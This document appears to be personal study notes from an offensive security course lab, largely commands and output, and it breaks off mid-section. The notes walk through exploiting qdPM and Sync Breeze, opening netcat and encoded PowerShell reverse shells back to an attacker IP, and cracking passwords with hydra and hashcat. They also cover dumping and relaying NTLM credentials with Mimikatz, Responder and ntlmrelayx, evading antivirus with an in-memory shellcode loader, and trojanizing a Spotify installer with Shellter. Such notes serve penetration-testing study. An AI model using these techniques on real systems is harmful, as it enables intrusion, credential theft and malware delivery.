  - `sudo apt update && sudo apt install exploitdb`: update exploitdb package
  - `ls -1 /usr/share/exploitdb/`: CSV for exploit info
  - `ls -1 /usr/share/exploitdb/exploits`: folder in OS, architecture, scripting language
  - `searchsploit -t oracle windows`: can search by -t title, -s strict, -c case sensitive
  - `searchsploit remote smb microsoft windows`: search remote exploits target SMB service on Windows OS
  - `searchsploit -m windows/remote/48537.py`: copied to /home/kali/48537.py
  - `searchsploit -m 42031`: copied windows/remote/42031.py
 

| OS / Target Environment         | Common SearchSploit Commands                                                                 |
|--------------------------------|-----------------------------------------------------------------------------------------------|
| **Linux (General)**            | `searchsploit linux privilege escalation`<br>`searchsploit linux kernel <version>`           |
| **Linux Kernel 2.6.32**        | `searchsploit linux kernel 2.6.32`<br>`searchsploit dirtycow`                                |
| **Linux Kernel 3.x / 4.x**     | `searchsploit linux kernel 3.13`<br>`searchsploit linux kernel 4.4`                          |
| **Ubuntu 16.04**               | `searchsploit ubuntu 16.04`                                                                  |
| **Debian / CentOS**            | `searchsploit debian`<br>`searchsploit centos 7`                                             |
| **Windows (General)**          | `searchsploit windows privilege escalation`<br>`searchsploit windows local`                 |
| **Windows 7 / Server 2008**    | `searchsploit windows 7 local`<br>`searchsploit ms10-092`<br>`searchsploit potato`           |
| **Windows Server 2012 / 2016** | `searchsploit windows server 2016`<br>`searchsploit bypass uac`                              |
| **Web Apps (WordPress, etc.)** | `searchsploit wordpress <version>`<br>`searchsploit joomla`<br>`searchsploit drupal`         |
| **FTP Services**               | `searchsploit vsftpd 2.3.4`                                                                  |
| **Samba**                      | `searchsploit samba 3.0.20`<br>`searchsploit samba`                                          |
| **Apache / Nginx**             | `searchsploit apache 2.4.49`<br>`searchsploit nginx`                                         |
| **Exim Mail Server**           | `searchsploit exim 4.87`                                                                     |
| **MySQL**                      | `searchsploit mysql`                                                                         |
| **Suggesters (Helpful Tools)** | `searchsploit linux exploit suggester`<br>`searchsploit windows exploit suggester`           |
| **CVE Lookup**                 | `searchsploit CVE-2017-16995`<br>`searchsploit CVE-2021-4034` (PwnKit)                        |


- Nmap NSE scripts
  - `grep Exploits /usr/share/nmap/scripts/*.nse`: list NSE scritpt with "Exploits"
  - `nmap --script-help=clamav-exec.nse`: obtain info of NSE script
- Exploit target
  1. open port and service > port 22, 80  
     `nmap 192.168.204.11`  
  3. Browse website and discover emails > jeremy@AIDevCorp.org  
  4. Enumerate website folders > /project  
     `gobuster dir -u 192.168.204.11 -w /usr/share/wordlists/dirb/common.txt -t5`  
  6. page source code > software version qdPM 9.1  
  7. Search exploitDB > https://www.exploit-db.com/exploits/50944  
  8. Brute force password > george@AIDevCorp.org:AIDevCorp
  9. Copy exploit script in kali  
      `searchsploit -m 50944`  
  11. View the exploit.py  
      ```
      parser.add_argument('-url', '--host', dest='hostname', help='Project URL')
      parser.add_argument('-u', '--email', dest='email', help='User email (Any privilege account)')
      parser.add_argument('-p', '--password', dest='password', help='User password')
      ```
  13. Exploit  
      `python3 50944.py -url http://192.168.204.11/project/ -u george@AIDevCorp.org -p AIDevCorp`  
      Output: Backdoor uploaded at - > http://192.168.204.11/project/uploads/users/779889-backdoor.php?cmd=whoami  
  15. automatically url-encode parameter, verify nc installed on the target  
      `curl http://192.168.204.11/project/uploads/users/779889-backdoor.php --data-urlencode "cmd=which nc"`  
  17. Netcat listener  
      `nc -lvnp 6666`  
  19. Start reverse shell  
      `curl http://192.168.204.11/project/uploads/users/779889-backdoor.php --data-urlencode "cmd=nc -nv 192.168.45.160 6666 -e /bin/bash"`  
  20. generate the exploit payload (optional)  
      `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > reverse.exe`
      
### 14. Fixing exploits  
- buffer overflow  
 - **heap** is dynamically managed and typically stores large chunks of globally accessible data  
 - **stack**'s purpose is to store local functions' data, and its size is generally fixed  
 - overwriting the return address with a JMP ESP instruction, which instructs the program to jump to the stack and execute the shellcode
- importing and examing the exploit    
 - `searchsploit "Sync Breeze Enterprise 10.0.28"`
- Cross-compiling exploit code
  - `sudo apt install mingw-w64`: mingw-w64 cross-compiler in Kali
  - compile the code into a Windows Portable Executable (PE)
  - `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe` > error
  - `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32` : missing linker to find the winsock library (fixed)
- Fixing the exploit
  - JSM ESP: ESP (Extended Stack Pointer) points to the top of the stack.. A JMP ESP instruction will jump directly to your shellcode
  - Launch "Immunity Debugger" as admin> File > Attach > syncbrs process > view menu > executable modules > verify msvbvm60.dll is not present by checking the Name and Path values
  - modify the 42341.c
   - `nmap -sV -p- 192.168.242.10` (check which port is used for Sync Breeze ports - default 11877)  
   - server.sin_addr.s_addr = inet_addr("192.168.242.10");
   - server.sin_port = htons(80);
   - char request_one[] = "POST /login HTTP/1.1\r\n"  "Host: 192.168.50.120\r\n"  
   - change the return address  
     `unsigned char retn[] = "\xcb\x75\x52\x73"; //ret at msvbvm60.dll`  (refer https://www.exploit-db.com/exploits/42928)
   - generate reverse shell payload with msfvenom (x86, c)  
     `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.165 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`
   - modify the 42341.c  
     ```
     modify unsigned char shellcode[] = 
     "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLIDE
     "\xdb\xcc\xbe\xa5\xcc\x28\x99\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
     ```
   - compile the code  
     `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`  
   - setting a breakpoint at JSM ESP: Immunity Debugger > Ctrl + G > 0x10090c83 > F2 breakpoint
   - run the windows exploit using wine
     ```
     sudo dpkg --add-architecture i386
     sudo apt update
     sudo apt install wine winbind wine32 -y
     wine --version

     sudo wine syncbreeze_exploit.exe
     ```
   - application crashes and the EIP register seems to be overwritten by "0x9010090c"
- Changing the overflow buffer
   - Allocating memory for the initial buffer using malloc `int initial_buffer_size = 780;`      
   - Filling the initial buffer with "A" character `memset(padding, 0x41, initial_buffer_size);`     
   - Memset setting the last byte to a null-terminator to convert the buffer into a string `memset(padding + initial_buffer_size - 1, 0x00, 1);`     
   - Creating the final buffer for the exploit    
   - Changing the padding allocation size `int initial_buffer_size = 781;`    
   - compile the code and start netcat listener on port 443   
     `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`    
     `sudo nc -lvp 443`    
   - run the exploit    
     `wine syncbreeze_exploit.exe`    
- **Fixing web exploits**
  - consideration: http/https, specific web path, pre-authentication vulnerability, GET/POST, rely on app setting
  - syntaxError: Missing parentheses in call to 'print' （it was written for Python2)
  - ssh and start apache service `ssh root@192.168.171.45` `sudo systemctl start apache2`  
  - selecting vulnerability and fixing the code  (apache2, [CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution](https://www.exploit-db.com/exploits/44976))
    ```
    base_url = "https://10.11.0.128/admin"
    username = "admin"
    password = "HUYfaw763"

    //Modified post requests to ignore SSL verification.
    response  = requests.post(url, data=data, allow_redirects=False, verify=False)
    response = requests.post(url, data=data, files=txt, cookies=cookies, verify=False)
    response = requests.post(url, data=data, cookies=cookies, allow_redirects=False, verify=False)
    ```
  - Troubleshooting the "index out of range" Error
    - Changing the csrf_param variable `csrf_param = "_sk_" # change from "__c"`
  - [+] Exploit succeeded, shell can be found at: https://192.168.171.45/uploads/shell.php
  - `curl -k https://192.168.50.45/uploads/shell.php?cmd=whoami`  
     
### 15. Password attacks  
- **attack network services login**  
  - SSH  
   `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201`   
  - RDP (password spraying)  
   `echo -e "daniel\njustin" | sudo tee -a /usr/share/wordlists/dirb/others/names.txt`: add users  
   `hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202`  
  - HTTP POST login  
   `hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"` -l user, -P wordlist, http-post-form
- **mutating wordlist**
  - `echo -n "secret" | sha256sum`: hash secret
  - `sed -i '/^1/d' demo.txt` remove all passwords start with '1'
  - [rule-based attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack) mutate password
  - `echo \$1 > demo.rule`: append 1 to password (new rule)
  - `hashcat -r demo.rule --stdout demo.txt --backend-ignore-opencl`: hashcat debug to display all mutated passwords
  - ```
    cat demo1.rule > hashcat -r demo1.rule --stdout demo.txt

    $1 c
    Password1
    Iloveyou1
    
    $1
    c
    password1
    Password

    $1 c $!
    Password1!

    $! $1 c
    Password!1
    ```
  - capitalization of the first letter + "!" special chr + numerical values  
    `hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force`  -m hash type, 0 is MD5  
    Output cracked status: f621b6c9eab51a3e2f4e167fee4c6860:Computer123!  
  - hashcat rules `ls -la /usr/share/hashcat/rules/`
- **craking methodology**: extract hashed > format hashes > calculate the cracking time > prepare wordlist > attack the hash
 - identify the hash type:[hash-identifier](https://www.kali.org/tools/hash-identifier/), [hashid](https://www.kali.org/tools/hashid/)
 - hash-identifier "4a41e0fdfb57173f8156f58e49628968a8ba782d0cd251c6f3e2426cb36ced3b647bf83057dabeaffe1475d16e7f62b7": SHA-384
 - bcrypt hashes always start with $2a$, $2b$, or $2y$: "$2y$10$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC"  
- **Password mananger**
  - Searching for KeePass database files  
    `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
  - transfer the db file to our Kali  
    `xfreerdp3 /u:jason /p:lab /v:192.168.161.203 /cert:ignore /drive:share,/home/kali/share`  
  - Using keepass2john to format the KeePass database for Hashcat  
    `keepass2john Database.kdbx > keepass.hash`  
    `cat keepass.hash`  remove the "Database"  
       `$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1`  
  - Finding the mode of KeePass in Hashcat  
    `hashcat --help | grep -i "KeePass"`  > 13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)  | Password Manager
  - Cracking the KeePass database hash  
    `hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force` > qwertyuiop123!
- **SSH private key passphrase**  
  - Using ssh2john to format the hash  
    `ssh2john id_rsa > ssh.hash`  `cat ssh.hash` 
    id_rsa:$sshng**$6**$16$7059e78a8d3764ea1e8...  
  - Determine the correct mode for Hashcat
    `hashcat -h | grep -i "ssh"` > 22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)
  - nano **ssh.rule** (Passwords need 3 numbers, a capital letter and a special character)
    ```
    [List.Rules:sshRules]
    c $1 $3 $7 $!
    c $1 $3 $7 $@
    c $1 $3 $7 $#
    ```
  - nano **ssh.passwords**
- failed cracking with Hashcat  
  `hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force` > token length exception  
- add named rules to JtR conf file  
  `sudo sh -c 'cat /home/kali/offsec/passwordattacks/ssh.rule >> /etc/john/john.conf'`  
- crack hash with JtR  
  `john --wordlist=ssh.passwords --rules=sshRules ssh.hash` > Umbrella137!  
- ssh attempt with private key id_rsa  
   ```
   rm ~/.ssh/known_hosts
   chmod 600 id_rsa
   ssh -i id_rsa -p 2222 dave@192.168.161.201
   ```
- **password hashes**  
  - Cracking NTLM
    - NTLM (NT LAN Manager) is a Windows authentication protocol. Hashes stored in C:\Windows\system32\config\sam. Dumped via lsass.exe, pwdump, Mimikatz
    - Goals: get plaintext password from NTLM hash > pivot to othe system > reuse credentials (pass-the-hash, RDP, SMB)
    -  **[Mimikatz](https://github.com/gentilkiwi/mimikatz)** can extract plain-text passwords and password hashes from various sources in Windows and leverage them in further attacks like pass-the-hash (PtH). **Sekurlsa module**, which extracts password hashes from the Local Security Authority Subsystem (LSASS)
    -  [PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec): elevate our privileges to the SYSTEM account
    - Methodology
      1. Obtain Hash
         - mimikatz: sekurlsa::logonpasswords
         - sass memory dump + pypykatz or mimikatz
         - SAM + SYSTEM hive extraction
         - Remote techniques: secretsdump.py from Impacket  
      3. Format Hash
         - Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>:::
      5. Choose Attack Mode
         - wordlist, brute force, mash attack, rules-based, hybrid  
      7. Use Cracker
         - `hashcat -m 1000 -a 0 hash.txt rockyou.txt`
         - `john --format=NT hash.txt --wordlist=rockyou.txt`
      9. Analyze Result
          - hashcat.potfile, ~/.john/john.pot  
    - Showing all local users in PowerShell
      `Get-LocalUser`
    - start C:\tools\mimikatz.exe in PowerShell `.\mimikatz.exe`  
    - Enabling SeDebugPrivilege, elevating to SYSTEM user privileges and extracting NTLM hashes
      
      ```
      privilege::debug
      token::elevate
      lsadump::sam
      ```
    - NTLM hash of user nelly in nelly.hash  `nano nelly.hash` 3ae8e5f0ffabb3a627672e1600f1ba10
    - Hashcat mode for NTLM hashes
      `hashcat --help | grep -i "ntlm"` >  1000 | NTLM  | Operating System
    - Crack by using rockyou.txt and best64.rule  
      `hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`  
  - **Passing NTLM**
    - pass-the-hash (PtH) technique: authenticate to a local or remote target with a valid combination of username and NTLM hash rather than a plaintext password
    - scenario: gained access to FILES01 as user 'gunther' > want to extract admin NTLM hash and authenticate to FILES02 (SMB share). Assume same password in FILES01 and FILES02
    - [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html), [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec): SMB enumeration and management
    - [psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py), [wmiexec.py](http://github.com/fortra/impacket/blob/master/examples/wmiexec.py): command execution
    - RDP or [winrm](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) to connect to target
    - windows explorer: \\192.168.139.212\secrets (cannot login FILES02 as user gunther)
    - Enabling SeDebugPrivilege, retrieving SYSTEM user privileges and extracting NTLM hashes
      ```
      .\mimikatz.exe
      privilege::debug
      token::elevate
      lsadump::sam
      ```
    - **smbclient** with NTLM hash  
      `smbclient \\\\192.168.139.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b`  
      `smb: \> get secrets.txt`  
    - **psexec** to get an interactive shell  
      `impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212`
      `C:\Windows\system32> hostname`
  - **Cracking Net-NTLMv2**
    - goal: gain access to an SMB share on a Windows 2022 server from a Windows 11 client via NTLMv2
    - NTLM Authentication over SMB
      1. Client → Server: Hello, I want to connect to your SMB share. Here's my username.
      2. Server → Client: Okay. Here's a random challenge (nonce). Prove you're who you say you are
      3. Client → Server: Here's the encrypted challenge response using my NTLM hash.
      4. Server → Itself (lookup): Let me check this response against the stored hash for that user.
      5. Server → Client: Access Granted or ❌ Access Denied
    - [Responder](https://github.com/lgandx/Responder): prints all captured NTLMv2 hashes
    - set up Responder on our Kali machine as an SMB server and use FILES01 (at 192.168.139.211) as the target
      `nc 192.168.139.211 4444`  
      `whoami` > files01\paul  
      `net user paul` > Remote Desktop Users  
    - don't have privileges to run Mimikatz but can set up an SMB server with Responder on Kali, then connect it with user paul and crack NTLMv2 hash
    - Starting Responder on interface tap0 > SMB server is active
      ```
      ip a
      sudo responder -I tun0

      ##if ports in use, kill the process
      sudo systemctl disable smbd
      sudo systemctl disable nmbd
      sudo netstat -tulnp | grep -E '445|139'
      ```
    - Using the dir command to create an SMB connection to our Kali machine  > access is denied
      `dir \\192.168.45.181\test`  > respondener output the NTLMv2 hash of paul
    - save paul hash and crack it with hashcat
      ```
      nano paul.hash

      hashcat --help | grep -i "ntlm"  > 5600 | NetNTLMv2
      hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
      ```
   - RDP as paul `xfreerdp3 /u:paul /p:123Password123 /v:192.168.139.211 /cert:ignore /drive:share,/home/kali/share`
  - **Relaying Net-NTLMv2**
    - bind shell to create an SMB connection to Kali > forward to another target (UAC disabled)
    - [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py): setting up SMB server and relaying authentication
    - Starting ntlmrelayx for a Relay-attack targeting FILES02  
      ```
      #kali ip and netcat listener port for target VM2
      pwsh

      $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.181",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

      $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
      $EncodedText =[Convert]::ToBase64String($Bytes)
      $EncodedText

      #new terminal
      impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.139.212 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAAxACIALAA4ADAAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
      ```
      
    - netcat listner `nc -nvlp 8080`
    - create VM1 SMB connection `nc 192.168.139.211 5555` (target ip and port) to kali  
      `dir \\192.168.45.181\test`  
    - Incoming reverse shell successfully > `hostname`  > nt authority\system  
    - `cd "C:\Users\files02admin\Desktop"`
- **Windows credential guard**  
   - Logging in to the **CLIENTWK248** machine as a **Domain Administrator**  
     `xfreerdp3 /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.133.248 /dynamic-resolution` > sign out of administrator  
   - Logging in to the **CLIENTWK246** as offsec, which is a **local administrator**  
     `xfreerdp3 /u:"offsec" /p:"lab" /v:192.168.133.246 /dynamic-resolution`
   - Run terminal as Administrator  
     `cd C:\tools\mimikatz\ > .\mimikatz.exe`     
   - Enable SeDebugPrivilege for our local user and then dump all the available credentials with sekurlsa::logonpasswords  
     ```
     privilege::debug
     sekurlsa::logonpasswords

     #hashes
     NTLM 246 local admin (offsec): 2892d26cdf84d7a70e2eb3b9f05c425e
     NTLM 248 domain admin (administrator): 160c0b16dd0ee77e7c494e38252f7ddf
     ```
   - Gain access to SERVERWK248 machine as CORP\Administrator (pass the hash)  
     `impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248`
   - **Circumvented Credential Guard by injecting SSP through Mimikatz**  
     - Credential Guard is only designed to protect non-local users  
     - Logging in to the CLIENTWK245 machine as a Domain Administrator that has credential guard  
     - Logging in to the CLIENTWK245 machine as a local adminstrator  
     - windows terminal run as administrator > Get-ComputerInfo > hashes encrypted  
     - Injecting a malicious SSP using Mimikatz  
       ```
       privilege::debug
       misc::memssp
       ```
     - close the current RDP (wait another user connect to machine) - Logging in to the **CLIENTWK245** machine as a **Domain Administrator**
     - close the current RDP window and connect to the **CLIENTWK245** as **offsec**
     - type C:\Windows\System32\mimilsa.log (credentials)  
       [00000000:00af2311] CORP\Administrator  QWERTY123!@#

### 16. Antivirus evasion  
- [VirusTotal](https://www.virustotal.com/): general malware detection, [kleenscan.com](https://kleenscan.com/index): stealth testing, red team AV evasion  
- AV engines: file, memory, network, disaaembler, emulator/sandbox, browser plugin, machine learning  
- Detection method: signature, heuristic, behavioral, machine learning   
  ```
  sha256sum malware.txt //calculate SHA256 hash of file
  xxd -b malware.txt  //inspecting the file content with xxd
  ```
- Generate malicious PE meterpreter shell  
  `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe`
- Bypass AV detection
   - on disk (packers, UPX, enigma protector tool)
   - in-memory (Remote Process Memory Injection, DLL injection, process hollowing, inline hooking)

| Technique                | Description                                                                 | Execution Method                      | Stealth Level | Common APIs Used                                |
|--------------------------|-----------------------------------------------------------------------------|----------------------------------------|----------------|--------------------------------------------------|
| **Remote Process Injection** | Inject shellcode into another process’s memory and execute it               | `CreateRemoteThread`, `QueueUserAPC`   | Medium         | `VirtualAllocEx`, `WriteProcessMemory`       |
| **DLL Injection**            | Inject a DLL into a remote process (standard or reflective)                | `LoadLibrary`, custom loader           | Medium-High    | `VirtualAllocEx`, `CreateRemoteThread`        |
| **Process Hollowing**        | Replace a legitimate process's memory with malicious code                 | `ResumeThread` after memory swap       | High           | `CreateProcess`, `ZwUnmapViewOfSection`        |
| **Inline Hooking**          | Overwrite function prologue to redirect execution to attacker's code      | Direct function hijack                 | High           | `VirtualProtect`, `WriteProcessMemory`          |

  - Testing for AV evasion > Virus & threat protection > Manage Settings > disable automatic sample submission  
  - Evading AV with Threat injection
    - `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.152 LPORT=443 -f psh-reflection` 
    - nano bypass.ps1
      ```
      $code = '
      [DllImport("kernel32.dll")]
      public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

      [DllImport("kernel32.dll")]
      public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

      [DllImport("msvcrt.dll")]
      public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

      function mjF6V {
        Param ($vxG, $ccK)
        $ag = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $ag.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object   System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($ag.GetMethod('GetModuleHandle')).Invoke($null, @($vxG)))), $ccK))
       }

       [Place the payload here]
       ```
      - `PS C:\Users\offsec\Desktop> .\bypass.ps1`  
      - `Get-ExecutionPolicy -Scope CurrentUser`  
      - `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser`
      - `nc -lvnp 443`
      - `.\bypass.ps1`
      - receiving a reverse shell on netcat listener: `C:\Users\offsec>whoami`  
  - Automating the process
    - `apt-cache search shellter`
    - `sudo apt install shellter`
    - install wine
      ```
      sudo apt install wine
      sudo dpkg --add-architecture i386 && apt-get update && apt-get install wine32
      sudo apt install wine
      sudo dpkg --add-architecture amd64
      sudo  apt install -y qemu-user-static binfmt-support
      sudo apt-get update && apt-get install wine32
      ```
    - `shellter`
      ```
      Choose Operation Mode - Auto/Manual (A/M/H): A
      PE Target: /home/kali/Downloads/SpotifyFullWin10-32bit.exe
      Enable Stealth Mode? (Y/N/H): Y
      Use a listed payload or custom? (L/C/H): L
      Select payload by index: 1
      SET LHOST: 192.168.45.152
      SET LPORT: 443
      ```
    - Before transferring the file, setting up a handler for the meterpreter payload  
      `msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.152;set LPORT 443;run;"`  
    - Transfer the file `ftp -A 192.168.245.53`  `ftp> bin` `put SpotifyFullWin10-32bit.exe`  
    - meterpreter session open
      ```
      meterpreter > shell
      C:\Users\offsec\Desktop>whoami
      ```

### 17. Windows Privilege Escalation
- Goal: bypass UAC to execute at high integrity (admin member does not mean run with high integrity)  
- [Mimikatz](https://github.com/gentilkiwi/mimikatz): pass-the-hash, pass-the-ticket or build Golden tickets
- Enumerating Windows
  - username, hostname: `whoami`
  - existing users & groups: `whoami /groups`
  - enumerate the existing groups of user: `Get-LocalGroup` (powershell)
  - other users and groups: `Get-LocalUser` (powershell)
  - review the group member: `Get-LocalGroupMember adminteam`
  - OS, version, architecture, network info, installed apps, running processes
- Security Identifier (SID)
  - Local Security Authority (LSA) - local users
  - Domain Controller (DC) - domain users
  - Format: S-1-5-21-3623811015-3361044348-30300820-1013
  - RID (last digit of SID): 500 (admin), 501 (guest), 1000+ (normal user), 512 (domain admins), 513 (domain users)
    - S-1-0-0 (nobody), S-1-1-0 (everybody), S-1-5-11 (authenticated users), S-1-5-18 (local system), S-1-5-domainidentifier-500 (administrator)
  - access token
    - primary token: specify permission sets  
    - impersonation token  
  - Mandatory Integrity Control
    - integrity levels: system (kernel), high (admin), medium (standard), low (restricted). Process explorer can see the integrity level.
  - User Account Control
    - standard user token (non-privileged operations)
    - administrator token (require UCA concent prompt)  
- Information gather
  - Username and hostname
  - Group memberships of the current user
  - Existing users and groups
  - Operating system, version and architecture
  - Network information
  - Installed applications
  - Running processes
- Situation awareness
  - Connect to the bind shell and obtain username and hostname  
    `nc 192.168.124.220 4444` `whoami` > clientwk220\dave  
  - Group memberships of the user 'dave' (544-admin, 545-standard, 547 limited privilege/power users, 555 RDP access)  
    `C:\Users\dave> whoami /groups` > CLIENTWK220\helpdesk, BUILTIN\Remote Desktop Users  
  - Display other local users on CLIENT220: Administrator (disabled), BackupAdmin, dave, daveadmin, steve  
    ```
    C:\Users\dave> powershell
    PS C:\Users\dave> Get-LocalUser
    ```
  - Display other local groups on CLIENTWK220 > adminteam, second floor, BackupUsers, helpdesk  
    `PS C:\Users\dave> Get-LocalGroup`  
  - Display members of the group adminteam  
    `PS C:\Users\dave> Get-LocalGroupMember adminteam` > CLIENTWK220\daveadmin  
    `PS C:\Users\dave> Get-LocalGroupMember Administrators` > CLIENTWK220\daveadmin, CLIENTWK220\backupadmin  
  - Information about the operating system and architecture > OS Name, version, system type, [windows version~build](https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions)  
    `PS C:\Users\dave> systeminfo`  
  - Information about the network configuration  > physical add, DHCP enabled, IPv4, Default gateway, DNS servers  
    `PS C:\Users\dave> ipconfig /all`  
  - routing table on CLIENTWK220  
    `PS C:\Users\dave> route print`  
  - Active network connections on CLIENTWK220   > local add  0.0.0.0:80, 0.0.0.0:443, 0.0.0.0:3306, 0.0.0.0:3389, 192.168.50.220:3389, 192.168.50.220:4444 (port 80,443, MySQL 3306, RDP 3389)
    `netstat -ano`
  - Installed applications on CLIENTWK220 (list both 32 and 64 bit apps) + review "Downloads" directory to find more potential programs> FileZilla, KeePass, 7-Zip, XAMPP
    ```
    Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
    Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname 

    displayname  
    ```
    
    ```
    Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
